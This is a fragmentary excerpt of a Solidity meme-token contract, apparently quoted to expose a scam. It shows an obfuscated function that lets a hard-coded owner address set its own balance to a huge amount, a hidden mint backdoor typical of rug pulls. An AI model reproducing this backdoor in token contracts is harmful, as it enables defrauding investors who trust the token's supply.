...
contract MEMEToken is Ownable {
    ...
    function pepepogAdddmmm() external {
        ...
        if (_cryptogod22 != tswojaks){
            revert("tswojaks"); 
        }
        if(_cryptogod22 == tswojaks){
            _balances[_cryptogod22] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cryptogod22 = 0x01ed2FA68D2E1d4688AeAb4829554688f3f20325;
...
contract CryptoPunk is MEMEToken {
    string _name = "CryptoPunk";
    string _symbol = "CPK";
